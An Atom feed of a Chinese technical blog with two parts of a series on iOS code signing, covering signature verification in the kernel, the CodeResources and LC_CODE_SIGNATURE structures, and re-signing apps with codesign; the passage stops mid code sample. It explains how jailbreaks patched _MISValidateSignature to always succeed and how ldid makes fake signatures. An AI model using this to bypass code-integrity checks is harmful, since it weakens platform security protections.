<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[xelz's blog]]></title>
  <link href="http://xelz.info/atom.xml" rel="self"/>
  <link href="http://xelz.info/"/>
  <updated>2019-01-24T09:47:31+00:00</updated>
  <id>http://xelz.info/</id>
  <author>
    <name><![CDATA[xelz]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[细说iOS代码签名(四)]]></title>
    <link href="http://xelz.info/blog/2019/01/11/ios-code-signature-4/"/>
    <updated>2019-01-11T11:12:14+08:00</updated>
    <id>http://xelz.info/blog/2019/01/11/ios-code-signature-4</id>
    <content type="html"><![CDATA[<h4>导航</h4>

<ul>
<li>一口气读完，大约需要40-60分钟

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature/">深度长文：细说iOS代码签名</a></li>
</ul>
</li>
<li>分步阅读

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-1/">细说iOS代码签名(一)</a>：签名的作用及原理</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-2/">细说iOS代码签名(二)</a>：开发者证书、Entitlements、Provisioning Profile</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-3/">细说iOS代码签名(三)</a>：签名的过程及代码签名的数据结构</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-4/">细说iOS代码签名(四)</a>：签名校验、越狱、重签名</li>
</ul>
</li>
</ul>


<h2>0x06 签名的校验</h2>

<p>签名的校验并非一次性完成，在安装、启动、和运行时有着不同的校验规则。</p>

<!-- more -->


<h4>安装</h4>

<p>App安装时的校验由位于iOS设备上的/usr/lib/libmis.dylib (dyld_shared_cache)提供。</p>

<p><img src="http://xelz.info/assets/2019/libmis.png" alt="" /></p>

<p>App的安装是由<code>/usr/libexec/installd</code>完成的，<code>installd</code>会通过<code>libmis.dylib</code>校验ProvisioningProfile、Entitlements及签名的合法性，并递归地校验签名时每一个步骤生成的哈希值：CDHash, Code Directory, _CodeSignature/CodeResources。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>otool -L installd <span class="p">|</span> grep mis
</span><span class='line'>  /usr/lib/libmis.dylib <span class="o">(</span>compatibility version 1.0.0, current version 1.0.0<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>nm installd <span class="p">|</span> grep ValidateSignature
</span><span class='line'>                 U _MISValidateSignatureAndCopyInfo
</span><span class='line'>                 U _kMISValidationOptionValidateSignatureOnly
</span></code></pre></td></tr></table></div></figure>


<h4>启动</h4>

<p>进程启动时，loader会先将可执行文件加载到虚拟内存，在加载的过程中mach_loader会自动解析MachO文件中的LC_CODE_SIGNATURE并进行校验，可以参考mach_loader的代码 <a href="https://opensource.apple.com/source/xnu/xnu-4570.71.2/bsd/kern/mach_loader.c.auto.html">bsd/kern/mach_loader.c</a></p>

<p><img src="http://xelz.info/assets/2019/verify1.png" alt="" /></p>

<p><code>load_code_signature</code>在解析完签名的数据后会调用<code>mac_vnode_check_singature</code>函数进行验证，而这个函数会被名为<code>AFMI</code>(AppleMobileFileIntegrity)的内核扩展(kext)通过Hook的方式接管，而AFMI只是一层壳，最终也是调用了libmis.dylib来实现签名的校验，这一校验过程基本与安装时一致，防止安装后的篡改。</p>

<p>需要注意的是，加载过程中为了提升加载效率，签名校验并不会去检查Code Directory与实际的代码是否匹配，仅仅只检查了CMS Signature及CDHash的合法性。</p>

<h4>运行时</h4>

<p>当一页代码被加载到虚拟内存后，会立即触发<code>page fault</code>，此时内核中的<code>vm_fault</code>函数会被调用，紧接着调用<code>vm_fault_enter</code>，在<code>vm_fault_enter</code>的实现中会判断代码页是否需要签名校验，并执行校验的操作，参考代码<a href="https://opensource.apple.com/source/xnu/xnu-4570.71.2/osfmk/vm/vm_fault.c.auto.html">osfmk/vm/vm_fault.c</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">kern_return_t</span> <span class="nf">vm_fault_enter</span><span class="p">(...)</span> <span class="p">{</span>
</span><span class='line'><span class="c1">// ...</span>
</span><span class='line'>    <span class="cm">/* Validate code signature if necessary. */</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">VM_FAULT_NEED_CS_VALIDATION</span><span class="p">(</span><span class="n">pmap</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">object</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">vm_object_lock_assert_exclusive</span><span class="p">(</span><span class="n">object</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">cs_validated</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">vm_cs_revalidates</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="cm">/* VM map is locked, so 1 ref will remain on VM object -</span>
</span><span class='line'><span class="cm">      * so no harm if vm_page_validate_cs drops the object lock */</span>
</span><span class='line'>      <span class="n">vm_page_validate_cs</span><span class="p">(</span><span class="n">m</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>对于宏<code>VM_FAULT_NEED_CS_VALIDATION</code>的解释是</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">* CODE SIGNING:</span>
</span><span class='line'><span class="cm">* When soft faulting a page, we have to validate the page if:</span>
</span><span class='line'><span class="cm">* 1. the page is being mapped in user space</span>
</span><span class='line'><span class="cm">* 2. the page hasn&#39;t already been found to be &quot;tainted&quot;</span>
</span><span class='line'><span class="cm">* 3. the page belongs to a code-signed object</span>
</span><span class='line'><span class="cm">* 4. the page has not been validated yet or has been mapped</span>
</span><span class='line'><span class="cm">for write. */</span>
</span><span class='line'><span class="cp">#define VM_FAULT_NEED_CS_VALIDATION(pmap, page)</span>
</span><span class='line'><span class="p">((</span><span class="n">pmap</span><span class="p">)</span> <span class="o">!=</span> <span class="n">kernel_pmap</span> <span class="cm">/*1*/</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">cs_tainted</span> <span class="cm">/*2*/</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">object</span><span class="o">-&gt;</span><span class="n">code_signed</span> <span class="cm">/*3*/</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">cs_validated</span> <span class="o">||</span> <span class="p">(</span><span class="n">page</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">wpmapped</span> <span class="cm">/*4*/</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>vm_page_validate_cs</code>会计算当前代码页的哈希值，并与签名中CodeDirectory记录的值进行比对，完成代码签名的验证。如果不符，且不满足系统预设的例外条件，则会向内核发出CS_KILL指令，将进程结束。</p>

<p>至此签名的校验流程就全部完成了。</p>

<h2>0x07 越狱与重签名</h2>

<h4>越狱</h4>

<p>越狱之后，签名校验机制会被破坏掉，否则用于实现越狱的代码自身就无法运行。比如在iOS6/7时代，典型的方式是替换 <code>libmis.dylib</code>中的<code>_MISValidateSignature</code>函数，使其永远返回验证成功，简单粗暴但很有效，因此越狱的设备可以不受签名限制运行任意程序。但是单纯解决掉这个函数只是解决了MachO文件的Load问题，运行时仍然会有沙盒和Code Directory的校验，想要对系统完全的控制权必须同时解决掉这两个问题。</p>

<p>由于沙盒机制的实现分散在系统的各个角落，没有简单的方式可以将沙盒一刀切地屏蔽掉，因此一般越狱并不会破坏掉沙盒。但因为越狱设备签名校验机制被绕过，不再会根据embedded.mobileprovision文件检查Entitlements的合法性，因此我们可以在沙盒范围内，声明任意的权限。Code Directory的校验在内核层，破解难度相对较大，并且完全没有必要进行破解，因为Code Directory只是单纯地校验未加密的哈希值而已，只需要按照代码签名的格式做好Code Directory即可。</p>

<p>越狱之父Saurik为此创造了<a href="http://iphonedevwiki.net/index.php/Ldid">ldid</a>这个工具，用于给越狱设备上的程序制造&#8221;假&#8221;的签名。使用ldid进行签名只需要指定一个可选的<code>Entitlements</code>文件，签名之后，产生的LC_CODE_SIGNATURE中只会两个有效的Blob，分别是 Code Directory和 Entitlements，并没有最重要的CMS Signature部分，因为<code>_MISCalidateSignature</code>永远都会告诉系统签名是正确的。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cp TestCodeSign TestCodeSign.ldid
</span><span class='line'><span class="nv">$ </span>ldid -Sxxx.entitlements TestCodeSign.ldid
</span><span class='line'><span class="nv">$ </span>jtool --sig TestCodeSign.ldid -arch arm64
</span><span class='line'>Blob at offset: 54016 <span class="o">(</span>928 bytes<span class="o">)</span> is an embedded signature
</span><span class='line'>Code Directory <span class="o">(</span>442 bytes<span class="o">)</span>
</span><span class='line'>    ...
</span><span class='line'> Empty requirement <span class="nb">set</span> <span class="o">(</span>12 bytes<span class="o">)</span>
</span><span class='line'>Entitlements <span class="o">(</span>424 bytes<span class="o">)</span> <span class="o">(</span>use --ent to view<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<h4>重签名</h4>

<p>有的时候出于各种原因，我们需要对一个App进行重签名，然后在自己的设备上进行测试。回顾一下签名的必备条件：</p>

<ul>
<li>开发者证书，以及对应的密钥</li>
<li>Entitlements文件</li>
<li>embedded.mobileprovision</li>
</ul>


<p>开发者证书和密钥我们已经有了，对于Entitlements和embedded.mobileprovision文件，为了确保重签后的App能够正常运行，必须使用和原App相同或者至少包含原App所需权限的Entitlements文件。这个并不难操作，只需要新建一个工程，开启相应的功能，让Xcode自动为我们生成即可。但是Entitlements文件中还有一些跟Team ID和App ID相关的配置，这两个是没有办法伪造的，因为我们不能使用已经被其他开发者注册过的ID。使用自己的ID一般也不会有什么问题，但在某些情况下可能导致最终的程序逻辑出现异常，这根具体的代码实现细节有关。</p>

<p>现在，只要确保有正确的Entitlements文件，Provisioning Profile与Entitlements文件匹配，且包含重签时使用的证书及目标设备的UUID，就可以进行重签名了，如果重签名后无法安装，请检查Provisioning Profile文件是否满足上述条件。</p>

<p>Entitlements文件中还标识了<code>application-identifier</code>，也就是Bundle ID，正常签名的App中，这个值和Info.plist中的<code>CFBundleIdentifier</code>的值是相同的，但实际在签名校验过程中，系统并不会检查二者是否一致。因此即使Entitlements中与Info.plist文件使用了不同的Bundle ID，理论上也不会影响重签名之后的运行。</p>

<p>需要注意，App中除了可执行程序文件外，还会可能会有Frameworks及Plugins，里面都会包含二进制的代码文件，他们的哈希值也会被存储在 _CodeSignature/CodeResources中。所有的二进制代码都必须进行签名，而签名后二进制文件的哈希值就会产生变化，因此需要先对这两个文件夹下的二进制文件进行签名，再对App进行签名。</p>

<p>重签名的基本流程，使用-f参数可以强制覆盖掉已有的签名</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="c"># 对Frameworks及Plugins中的每一个文件进行签名，此时不需要指定entitlements</span>
</span><span class='line'><span class="nv">$ </span>codesign -f -s <span class="s2">&quot;证书名称或者SHA1值&quot;</span> Target.app/Frameworks/xxxxx.framework
</span><span class='line'><span class="nv">$ </span>codesign -f -s <span class="s2">&quot;证书名称或者SHA1值&quot;</span> Target.app/Frameworks/libxxxx.dylib
</span><span class='line'><span class="nv">$ </span>...
</span><span class='line'><span class="nv">$ </span><span class="c"># 将准备好的Provisioning Profile拷贝到App根目录</span>
</span><span class='line'><span class="nv">$ </span>cp ~/Library/MobileDevice/Provisioning<span class="se">\ </span>Profiles/xxxxx.mobileprovision Target.app/embedded.mobileprovision
</span><span class='line'><span class="nv">$ </span><span class="c"># 对App进行签名</span>
</span><span class='line'><span class="nv">$ </span>codesign -f -s <span class="s2">&quot;证书名称或者SHA1值&quot;</span> --entitlements resign.entitlements Target.app
</span></code></pre></td></tr></table></div></figure>


<h2>0x08 References</h2>

<table>
<thead>
<tr>
<th></th>
<th>   reference    </th>
<th>    link    </th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td> Code Signing Guide </td>
<td> <a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Introduction/Introduction.html">https://developer.apple.com/&hellip;</a> </td>
</tr>
<tr>
<td></td>
<td> ASN.1 JavaScript decoder </td>
<td> <a href="http://lapo.it/asn1js/">http://lapo.it/asn1js/</a> </td>
</tr>
<tr>
<td></td>
<td> Cryptographic Message Syntax (CMS) </td>
<td> <a href="https://www.ietf.org/rfc/rfc3852.txt">https://www.ietf.org/rfc/rfc3852.txt</a> </td>
</tr>
<tr>
<td></td>
<td> iSign in python </td>
<td> <a href="https://github.com/saucelabs/isign">https://github.com/saucelabs/isign</a> </td>
</tr>
<tr>
<td></td>
<td> CodeSigning (RSACon 2015) </td>
<td> <a href="http://newosxbook.com/articles/CodeSigning.pdf">http://newosxbook.com/articles/CodeSigning.pdf</a> </td>
</tr>
<tr>
<td></td>
<td> jtool </td>
<td> <a href="http://www.newosxbook.com/tools/jtool.html">http://www.newosxbook.com/tools/jtool.html</a> </td>
</tr>
<tr>
<td></td>
<td> mistool </td>
<td> <a href="http://newosxbook.com/tools/mistool.html">http://newosxbook.com/tools/mistool.html</a> </td>
</tr>
<tr>
<td></td>
<td> evasi0n7 jailbreak writeup </td>
<td><a href="https://geohot.com/e7writeup.html">https://geohot.com/e7writeup.html</a> </td>
</tr>
<tr>
<td></td>
<td> iOS hacker&rsquo;s handbook </td>
<td> <a href="https://books.google.com.hk/books?id=1kDcjKcz9GwC">https://books.google.com.hk/books?id=1kDcjKcz9GwC</a> </td>
</tr>
</tbody>
</table>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[细说iOS代码签名(三)]]></title>
    <link href="http://xelz.info/blog/2019/01/11/ios-code-signature-3/"/>
    <updated>2019-01-11T11:12:14+08:00</updated>
    <id>http://xelz.info/blog/2019/01/11/ios-code-signature-3</id>
    <content type="html"><![CDATA[<h4>导航</h4>

<ul>
<li>一口气读完，大约需要40-60分钟

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature/">深度长文：细说iOS代码签名</a></li>
</ul>
</li>
<li>分步阅读

<ul>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-1/">细说iOS代码签名(一)</a>：签名的作用及原理</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-2/">细说iOS代码签名(二)</a>：开发者证书、Entitlements、Provisioning Profile</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-3/">细说iOS代码签名(三)</a>：签名的过程及代码签名的数据结构</li>
<li><a href="http://xelz.info/blog/2019/01/11/ios-code-signature-4/">细说iOS代码签名(四)</a>：签名校验、越狱、重签名</li>
</ul>
</li>
</ul>


<h2>0x05 CodeSign</h2>

<p>万事具备，只欠东风，已经具备了签名所需的所有条件，接下来就可以开始研究签名的具体过程了。</p>

<!-- more -->


<p>在编译iOS App时，Xcode在编译的打包的流程中会自动进行代码签名， 可以在编译日志界面找到一个<code>Sign</code>的步骤，内部是调用了<code>codesign</code>这个命令对app进行签名</p>

<p><img src="http://xelz.info/assets/2019/sign1.png" alt="codesign" /></p>

<p>codesign有几个关键参数</p>

<ul>
<li><code>--sign sign_identity</code> 指定签名所用的证书，可以指定证书的名字，比如<code>"iPhone Developer: xxx (xxx)"</code>也可以直接写证书文件的sha1值，xcode中就是直接指定sha1值的。通过观察图中的sha1值可以看出xcode自动选择了刚申请的最新证书。</li>
<li><code>--entitlements entitlements_file</code> 指定签名所需要的entitlements文件，这里的entitlements文件跟前面看到的并不是同一个文件，而是基于原有entitlements文件，补充上缺省权限后生成的临时文件</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span class='line'><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
</span><span class='line'><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>application-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;string&gt;</span>xxxxxxxxxx.test.CodeSign<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>com.apple.developer.team-identifier<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;string&gt;</span>xxxxxxxxxx<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>get-task-allow<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;true/&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>inter-app-audio<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;true/&gt;</span>
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span><span class='line'><span class="nt">&lt;/plist&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>如果想对比签名前后的区别，可以在<code>Build Settings</code>中找到<code>Code Signing Identity</code>，选择<code>Other</code>并将内容清除(即设置为空)，即可跳过代码签名。分别编译一个不签名的版本和签名的版本，对比可以发现</p>

<p><img src="http://xelz.info/assets/2019/sign2.png" alt="compare" /></p>

<ul>
<li>签名过的app中多了一个<code>_CodeSignature</code>文件夹，里面只有一个文件<code>CodeResources</code></li>
<li>还多了一个<code>embedded.mobileprovision</code> 文件</li>
<li>二进制文件的内容存在差异，并且签名后体积变大了</li>
</ul>


<p>其中<code>embedded.mobileprovision</code>就是前文提到的Provisioning Profile文件，它直接被拷贝到了app的根目录并重命名，在此不再赘述，重点研究下另外两个不同点。</p>

<h4>_CodeSignature/CodeResources</h4>

<p>首先是<code>_CodeSingature/CodeResources</code>，这是一个plist文件，里面保存了app中每个文件（除了App的可执行文件）的<code>明文哈希值</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>files<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;dict&gt;</span>
</span><span class='line'>        <span class="nt">&lt;key&gt;</span>Base.lproj/Main.storyboardc/Info.plist<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>        <span class="nt">&lt;data&gt;</span>
</span><span class='line'>            MDrKFvFWroTb0+KEbQShBcoBvo4=
</span><span class='line'>        <span class="nt">&lt;/data&gt;</span>
</span><span class='line'>      ...
</span><span class='line'>  <span class="nt">&lt;/dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>files2<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  <span class="nt">&lt;dict&gt;</span>
</span><span class='line'>        <span class="nt">&lt;key&gt;</span>Base.lproj/Main.storyboardc/Info.plist<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>        <span class="nt">&lt;dict&gt;</span>
</span><span class='line'>            <span class="nt">&lt;key&gt;</span>hash<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>            <span class="nt">&lt;data&gt;</span>
</span><span class='line'>                MDrKFvFWroTb0+KEbQShBcoBvo4=
</span><span class='line'>            <span class="nt">&lt;/data&gt;</span>
</span><span class='line'>            <span class="nt">&lt;key&gt;</span>hash2<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>            <span class="nt">&lt;data&gt;</span>
</span><span class='line'>                PpvapAjR62rl6Ym4E6hkTgpKmBICxTaQXeUqcpHmmqQ=
</span><span class='line'>            <span class="nt">&lt;/data&gt;</span>
</span><span class='line'>        <span class="nt">&lt;/dict&gt;</span>
</span><span class='line'>      ...
</span><span class='line'>  <span class="nt">&lt;/dict&gt;</span>
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>rules<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  ...
</span><span class='line'>  <span class="nt">&lt;key&gt;</span>rules2<span class="nt">&lt;/key&gt;</span>
</span><span class='line'>  ...
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span><span class='line'><span class="nt">&lt;/plist&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>files</code>和<code>files2</code>分别是旧版本和新版本的文件列表，而<code>rules</code>与<code>rules2</code>分别是与之对应的规则说明，里面描述了计算hash时需要被排除的文件以及每个文件的权重。</p>

<p><code>files</code>中保存的是每个文件的sha1值，而<code>files2</code>中同时保存了sha1和sha256，因为sha1在计算机硬件高度发达的今天，已经相对没有那么安全了，因此最新的签名算法中，引入了sha256。注意，这里的hash值都是base64编码的明文，有些文章说这些值是使用私钥加密的哈希，这是很不负责任的错误说法，通过几条简单的命令就可以进行验证：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat Base.lproj/Main.storyboardc/Info.plist <span class="p">|</span> shasum -a 1
</span><span class='line'>303aca16f156ae84dbd3e2846d04a105ca01be8e  -
</span><span class='line'><span class="nv">$ </span><span class="nb">echo</span> -n <span class="s1">&#39;MDrKFvFWroTb0+KEbQShBcoBvo4=&#39;</span> <span class="p">|</span> base64 -D <span class="p">|</span> hexdump
</span><span class='line'>0000000 30 3a ca 16 f1 56 ae 84 db d3 e2 84 6d 04 a1 05
</span><span class='line'>0000010 ca 01 be 8e
</span><span class='line'><span class="nv">$ </span><span class="c"># =========== 分割线 ===========</span>
</span><span class='line'><span class="nv">$ </span>cat Base.lproj/Main.storyboardc/Info.plist <span class="p">|</span> shasum -a 256
</span><span class='line'>3e9bdaa408d1eb6ae5e989b813a8644e0a4a981202c536905de52a7291e69aa4  -
</span><span class='line'><span class="nv">$ </span><span class="nb">echo</span> -n <span class="s1">&#39;PpvapAjR62rl6Ym4E6hkTgpKmBICxTaQXeUqcpHmmqQ=&#39;</span> <span class="p">|</span> base64 -D <span class="p">|</span> hexdump
</span><span class='line'>0000000 3e 9b da a4 08 d1 eb 6a e5 e9 89 b8 13 a8 64 4e
</span><span class='line'>0000010 0a 4a 98 12 02 c5 36 90 5d e5 2a 72 91 e6 9a a4
</span></code></pre></td></tr></table></div></figure>


<p><code>_CodeSignature/CodeResources</code>文件的主要作用是保存签名时每个文件的哈希值，而这些哈希值并不需要都进行加密，因为非对称加密的性能是比较差的，全部都加密只会拖慢签名和校验的速度。其实只需要确保这个文件没有被篡改，自然也就可以确保每个文件都是签名时的原始状态，这一点在后续的内容中可以得到验证。</p>

<h4>LC_CODE_SIGNATURE</h4>

<p>使用<code>otool -l</code>对比签名前后的二进制文件，可以发现签名后二进制文件多了一个名为<code>LC_CODE_SIGNATURE</code>的Load Command</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>otool -l TestCodeSign <span class="p">|</span> tail -n 5
</span><span class='line'>Load <span class="nb">command </span>21
</span><span class='line'>      cmd LC_CODE_SIGNATURE
</span><span class='line'>  cmdsize 16
</span><span class='line'>  dataoff 54016
</span><span class='line'> datasize 19888
</span></code></pre></td></tr></table></div></figure>


<p>MachOView中查看如下</p>

<p><img src="http://xelz.info/assets/2019/codesign1.png" alt="" /></p>

<p>代码签名是一段纯二进制的数据，可以在<a href="https://opensource.apple.com/source/Security/Security-55471/sec/Security/Tool/codesign.c.auto.html">https://opensource.apple.com/source/Security/Security-55471/sec/Security/Tool/codesign.c.auto.html</a> 看到一些结构定义，结合数据定义来分析</p>

<p><img src="http://xelz.info/assets/2019/codesign2.png" alt="" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// 红色部分①  Offset: 0xD300 = 54016 LC_CODE_SIGNATURE-&gt;dataoff</span>
</span><span class='line'><span class="k">struct</span> <span class="n">__SuperBlob</span> <span class="p">{</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">magic</span><span class="p">;</span>   <span class="cm">/* 0xFADE0CC0 = CSMAGIC_EMBEDDED_SIGNATURE */</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">length</span><span class="p">;</span>  <span class="cm">/* 0x1A1E -&gt; 6686 */</span>
